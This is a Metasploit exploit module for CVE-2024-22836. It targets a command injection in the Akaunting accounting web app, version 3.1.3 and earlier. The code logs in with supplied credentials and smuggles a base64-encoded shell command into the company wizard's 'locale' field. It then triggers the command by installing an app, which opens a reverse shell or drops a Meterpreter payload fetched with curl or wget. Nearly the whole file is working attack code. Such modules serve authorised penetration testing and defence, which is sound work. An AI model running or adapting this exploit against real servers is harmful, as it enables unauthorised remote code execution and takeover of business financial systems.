##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  prepend Msf::Exploit::Remote::AutoCheck
  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Akaunting Module install RCE',
        'Description' => %q{
          This module exploits a command injection vulnerability in Akaunting version 3.1.3 and earlier. Akaunting allows
          users to add modules (apps) to their companies, and installs thoes modules using a php artisan command, passing the company
          locale as an argument. An improperly filtered wizard was found that allows users to add any text to the locale which
          allows for the command injection. This vulnerability also affects other modules operations (uninstall, enable, disable).
          Tested successfully against Akaunting 3.1.3 running on Ubuntu 22.04 (x64).
        },
        'License' => MSF_LICENSE,
        'Author' => [ 
          'Talal Nasraddeen <u32i@proton.me>' # Vulnerability discovery and Metasploit module
        ],
        'References' => [
          [ 'URL', 'https://github.com/u32i/cve/tree/main/CVE-2024-22836' ],
          [ 'CVE', '2024-22836' ]
        ],
        'Platform' => %w[unix linux],
        'Arch' => [ ARCH_CMD, ARCH_X86, ARCH_X64 ],
        'Targets' => [
          [
            'Unix (In-Memory)',
            {
              'Platform' => 'unix',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :unix_memory,
              'DefaultOptions' => {
                'PAYLOAD' => 'cmd/unix/reverse',
                'ENCODER' => 'cmd/echo'
              }
            }
          ],
          [
            'Linux Dropper',
            {
              'Platform' => 'linux',
              'Arch' => [ARCH_X86, ARCH_X64],
              'Type' => :linux_dropper,
              'CmdStagerFlavor' => [ 'curl', 'wget' ],
              'DefaultOptions' => {
                'PAYLOAD' => 'linux/x86/meterpreter/reverse_tcp',
                'ENCODER' => 'x86/shikata_ga_nai'
              }
            }
          ]
        ],
        'Payload' => {
          'BadChars' => "\x00",
        },
        'Privileged' => false,
        'DisclosureDate' => 'Feb 08 2024',
        'DefaultTarget' => 0,
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'Reliability' => [REPEATABLE_SESSION],
          'SideEffects' => [IOC_IN_LOGS, ARTIFACTS_ON_DISK]
        },
      )
    )

    register_options [
      OptString.new('EMAIL', [true, 'User account email']),
      OptString.new('PASSWORD', [true, 'User account password']),
      OptString.new('APP_ALIAS', [false, 'App to install', 'paypal-standard']),
      OptString.new('APP_VERSION', [false, 'App version', '3.0.2']),
    ]
  end

  def check
    res = send_request_raw({'uri' => normalize_uri(target_uri.path, 'auth', 'login')})
    fail_with(Failure::Unreachable, 'Site not responding') unless res
    fail_with(Failure::UnexpectedReply, 'Blocked by firewall') if res.code == 403 and res.body.include? 'Access Denied'
    
    version = res.body.scan(/\/css\/app\.css\?v=(.*)" type="text\/css">/).flatten.first
    if version.nil? || version.length <= 1
      return CheckCode::Detected
    end

    version = Rex::Version.new(version)
    if version < Rex::Version.new('3.1.4')
      return CheckCode::Appears
    end

    CheckCode::Safe
  end

  def login
    res = send_request_raw({'uri' => normalize_uri(target_uri.path, 'auth', 'login')})
    fail_with(Failure::Unreachable, 'Site not responding') unless res
    
    cookie = res.get_cookies
    token = res.body.scan(/"csrfToken"\:"(.*)"/).flatten.first
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, 'auth', 'login'),
      'method' => 'POST',
      'cookie' => cookie,
      'vars_post' => {
        '_token' => token,
        'email' => datastore['EMAIL'],
        'password' => datastore['PASSWORD']
      }
    )

    fail_with(Failure::UnexpectedReply, 'Authentication failed') unless res.code == 200 and res.body.include? '"success":true'
    fail_with(Failure::UnexpectedReply, 'Blocked by firewall') if res.code == 403 and res.body.include? 'Accedd Denied'

    print_status("Authenticated.")
    
    company_id = res.body.scan(/"redirect"\:".*\/([0-9]*)"/).flatten.first
    
    return company_id, token, res.get_cookies
  end

  def trigger_payload
    print_status("Triggering payload")
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, @company, 'apps', 'install'),
      'method' => 'POST',
      'cookie' => @cookie,
      'keep_cookies' => true,
      'headers' => {
        'X-Csrf-Token' => @token,
      },
      'vars_post' => {
        'alias' => datastore["APP_ALIAS"],
        'version' => datastore["APP_VERSION"], 
        'path' => "apps/#{datastore['APP_ALIAS']}/download"
      }
    )

    fail_with(Failure::Unreachable, 'Site not responding') unless res
    fail_with(Failure::UnexpectedReply, 'Failed to trigger payload') unless res.code == 200
    if res.body.include? '"message":"The command php artisan"'
      fail_with(Failure::UnexpectedReply, 'Command execution failed')
    end
  end

  def execute_command(cmd, _opts = {})
    @company, @token, @cookie = login
    res = send_request_cgi(
      'uri' => normalize_uri(target_uri.path, @company, 'wizard', 'companies'),
      'method' => 'POST',
      'cookie' => @cookie,
      'keep_cookies' => true,
      'vars_post' => {
        '_token' => @token,
        '_method'=> 'POST',
        '_prefix'=> 'company',
        'locale'=> "en_US && echo #{Rex::Text.encode_base64(cmd)} | base64 -d | sh &"
      }
    )

    fail_with(Failure::Unreachable, 'Site not responding') unless res
    fail_with(Failure::UnexpectedReply, 'Failed to inject payload') unless res.code == 200 and res.body.include? '"success":true'

    print_status("Payload injected.")

    trigger_payload
  end

  def exploit
    case target['Type']
    when :unix_memory
      execute_command(payload.encoded)
    when :linux_dropper
      execute_cmdstager
    end
  end

end
